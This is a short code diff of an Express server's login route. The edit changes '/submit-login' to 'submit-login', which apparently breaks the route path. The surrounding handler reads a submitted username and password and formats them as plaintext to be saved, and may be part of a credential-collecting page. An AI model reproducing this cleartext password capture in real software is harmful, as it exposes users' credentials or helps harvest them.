@@ -28,7 +28,7 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname)); // Serve static files from the "public" directory
 
 // Route to handle login form submission
-app.post('/submit-login', (req, res) => {
+app.post('submit-login', (req, res) => {
     const { username, password } = req.body;
     const data = `Username: ${username}, Password: ${password}\n`; // Format the data to save
 
